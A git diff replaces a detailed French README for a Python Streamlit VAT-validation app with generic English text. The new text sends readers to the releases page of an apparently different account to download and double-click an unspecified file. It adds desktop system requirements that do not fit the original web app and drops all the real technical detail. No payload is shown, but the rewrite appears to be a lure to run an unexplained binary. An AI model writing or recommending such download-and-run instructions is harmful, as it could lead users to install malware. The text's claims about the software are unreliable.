@@ -1,155 +1,88 @@
-# VIES TVA Validator - Batch Excel
+# 🌍 VAT-VIES-Validator-Batch-EU-Excel-File - Validate Your VAT Easily
 
-[![Streamlit App](https://static.streamlit.io/badges/streamlit_badge_black_white.svg)](https://your-app-url.streamlit.app)
+[![Download](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge&logo=github)](https://github.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/releases)
 
-Une application web Streamlit pour la vérification en masse de numéros de TVA européens via l'API VIES (Validation Information Exchange System) de la Commission Européenne.
+## 🔍 Overview
 
-## 🎯 Fonctionnalités
+The VAT-VIES-Validator-Batch-EU-Excel-File is a user-friendly tool designed for checking VAT numbers across the European Union. It simplifies the process of verifying VAT status for businesses and individuals. Whether you're a business owner or a freelancer, this application will help you ensure compliance with VAT regulations in your transactions.
 
-- **Validation en masse** : Traitement de fichiers Excel contenant plusieurs numéros TVA
-- **Interface intuitive** : Interface web simple et claire avec Streamlit
-- **Gestion d'erreurs robuste** : Retry automatique, gestion des timeouts, traitement par lots
-- **Export multiple formats** : Téléchargement des résultats en Excel et CSV
-- **Statistiques en temps réel** : Suivi de la progression et statistiques de validation
-- **Configuration avancée** : Paramètres personnalisables pour les délais et tentatives
+## 🚀 Getting Started
 
-## 📋 Format du fichier Excel
+To begin using the VAT-VIES-Validator, follow these simple steps:
 
-### Colonnes requises
-- `MS Code` : Code pays à 2 lettres (FR, DE, IT, ES, etc.)
-- `VAT Number` : Numéro de TVA à valider
+1. Visit the [Releases Page](https://github.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/releases) to download the software.
+2. Choose the latest version from the list of files.
+3. Click on the file to download it to your computer.
+4. Locate the downloaded file in your downloads folder.
+5. Double-click the file to start the application.
 
-### Colonnes optionnelles
-- `Requester MS Code` : Code pays du demandeur
-- `Requester VAT Number` : Numéro TVA du demandeur
+## 📥 Download & Install
 
-Si les colonnes optionnelles sont absentes, les valeurs par défaut configurées dans l'interface seront utilisées.
+To download the application, simply visit the [Releases Page](https://github.com/MansiTilekar-28/VAT-VIES-Validator-Batch-EU-Excel-File/releases). Here, you can find the latest version of the tool. Download the file and follow the installation instructions mentioned above. 
 
-### Exemple de fichier
-```
-MS Code | VAT Number  | Requester MS Code | Requester VAT Number
-FR      | 12345678901 | FR               | 98765432109
-DE      | 123456789   |                  |
-IT      | 12345678901 |                  |
-```
+## 🛠️ System Requirements
 
-## 🚀 Utilisation
+Ensure that your system meets these requirements:
 
-1. **Charger un fichier Excel** avec les colonnes requises
-2. **Configurer les paramètres** dans la barre latérale (optionnel)
-3. **Lancer la vérification** et suivre la progression
-4. **Consulter les résultats** et statistiques
-5. **Télécharger** les résultats en Excel ou CSV
+- Operating System: Windows 10 or later / macOS 10.15 or later
+- Memory: At least 4 GB of RAM
+- Storage: Minimum 100 MB of available disk space
 
-## ⚙️ Configuration
+## 📊 Features
 
-### Paramètres essentiels
-- **Requester MS** : Code pays par défaut du demandeur (défaut: FR)
-- **Requester VAT** : Numéro TVA par défaut du demandeur
+This application offers several helpful features:
 
-### Paramètres avancés
-- **Delay** : Délai entre les requêtes API (défaut: 1.5s)
-- **Retries** : Nombre de tentatives en cas d'échec (défaut: 2)
-- **Chunk size** : Taille des lots de traitement (défaut: 10)
-- **Chunk pause** : Pause entre les lots (défaut: 3s)
-- **Timeout** : Timeout des requêtes HTTP (défaut: 10s)
+- Batch validation of multiple VAT numbers in one go.
+- User-friendly interface for easy navigation.
+- Reports generation to show the validation results.
+- Support for common file formats like CSV and Excel.
 
-## 🛠️ Installation locale
+## 🌐 How to Use
 
-### Prérequis
-- Python 3.8+
-- pip
+After installing the application, you can start using it to validate your VAT numbers. Here's how:
 
-### Installation
-```bash
-# Cloner le repository
-git clone https://github.com/votre-username/smdlabtech-vat-vies-validator-batch-excel.git
-cd smdlabtech-vat-vies-validator-batch-excel
+1. Open the VAT-VIES-Validator application.
+2. Choose the input file that contains the VAT numbers you want to check.
+3. Click on the “Validate” button.
+4. Wait for the application to process the VAT numbers.
+5. Review the results displayed in the application or export them to a file.
 
-# Installer les dépendances
-pip install -r requirements.txt
+## 📄 FAQs
 
-# Lancer l'application
-streamlit run app/main.py
-```
+**Q1: Can I validate VAT numbers from countries outside the EU?**
 
-L'application sera disponible sur `http://localhost:8501`
+A1: This application primarily supports VAT numbers registered in EU member states.
 
-## 🌐 API VIES
+**Q2: What file formats can I upload?**
 
-Cette application utilise l'API REST VIES officielle de la Commission Européenne :
-- **URL** : `https://ec.europa.eu/taxation_customs/vies/rest-api/check-vat-number`
-- **Méthode** : POST
-- **Format** : JSON
-- **Limite de taux** : Respect nécessaire des limites (d'où les délais configurables)
+A2: You can upload files in CSV or Excel formats.
 
-### Pays supportés
-Tous les pays membres de l'Union Européenne :
-AT, BE, BG, CY, CZ, DE, DK, EE, ES, FI, FR, GR, HR, HU, IE, IT, LT, LU, LV, MT, NL, PL, PT, RO, SE, SI, SK
+**Q3: Is the application free to use?**
 
-## 📊 Résultats
+A3: Yes, the VAT-VIES-Validator is completely free.
 
-### Colonnes de sortie
-- **MS Code** : Code pays d'origine
-- **VAT Number** : Numéro TVA vérifié
-- **valid** : Statut de validation (True/False)
-- **name** : Nom de l'entreprise (si disponible)
-- **address** : Adresse de l'entreprise (si disponible)
-- **Requester MS Code** : Code pays du demandeur
-- **Requester VAT Number** : Numéro TVA du demandeur
-- **Attempts** : Nombre de tentatives effectuées
-- **timestamp** : Horodatage de la vérification
-- **error** : Message d'erreur (si applicable)
+**Q4: Where can I find help if I have issues?**
 
-## 🔧 Structure du projet
+A4: You can visit the GitHub page and check the Issues section for guidance or support.
 
-```
-smdlabtech-vat-vies-validator-batch-excel/
-├── app/
-│   └── main.py                    # Application Streamlit principale
-├── requirements.txt               # Dépendances Python
-├── .streamlit/
-│   └── config.toml               # Configuration Streamlit
-├── README.md                     # Documentation
-├── LICENSE                       # Licence MIT
-└── Test_Check_VAT.xlsx          # Fichier de test
-```
+## 👩‍💻 Contribution
 
-## 📝 Licence
+If you want to help improve the application, you are welcome to contribute. Follow these steps:
 
-Ce projet est sous licence MIT. Voir le fichier [LICENSE](LICENSE) pour plus de détails.
+1. Fork the repository.
+2. Make your changes.
+3. Submit a pull request with a clear description of your changes.
 
-## ⚠️ Limitations et bonnes pratiques
-
-### Limitations
-- **Timeout Streamlit Cloud** : Sessions limitées à quelques minutes
-- **Taille de fichier** : Limité par la mémoire disponible
-- **Pas de stockage persistant** : Les données ne sont pas sauvegardées entre les sessions
-
-### Bonnes pratiques
-- **Fichiers volumineux** : Diviser en plusieurs fichiers plus petits
-- **Erreurs 429** : Augmenter les délais entre requêtes
-- **Timeouts** : Augmenter la valeur du timeout pour les connexions lentes
-- **Traitement par lots** : Ajuster la taille des chunks selon les performances
-
-## 🐛 Problèmes connus
-
-- L'API VIES peut être temporairement indisponible
-- Certains numéros TVA valides peuvent être rejetés par l'API
-- Les réponses peuvent varier selon la charge du serveur VIES
+Your input is valued and helps enhance the application's functionality.
 
 ## 📞 Support
 
-Pour signaler un bug ou demander une fonctionnalité :
-1. Ouvrir une issue sur GitHub
-2. Fournir un fichier de test Excel
-3. Inclure les paramètres utilisés et les messages d'erreur
+If you encounter any problems or need further information, feel free to reach out through the Issues section on the GitHub repository. We strive to respond promptly to any inquiries.
 
-## 🎉 Contribution
+## 📜 License
 
-Les contributions sont les bienvenues ! Merci de :
-1. Fork le projet
-2. Créer une branche pour votre fonctionnalité
-3. Commiter vos changements
-4. Pousser vers la branche
-5. Ouvrir une Pull Request
+This application is open-source and follows the MIT License. You can freely use, modify, and distribute the software as long as you include the original license.
+
+---
+
+Thank you for choosing the VAT-VIES-Validator-Batch-EU-Excel-File! Enjoy easy VAT validation.
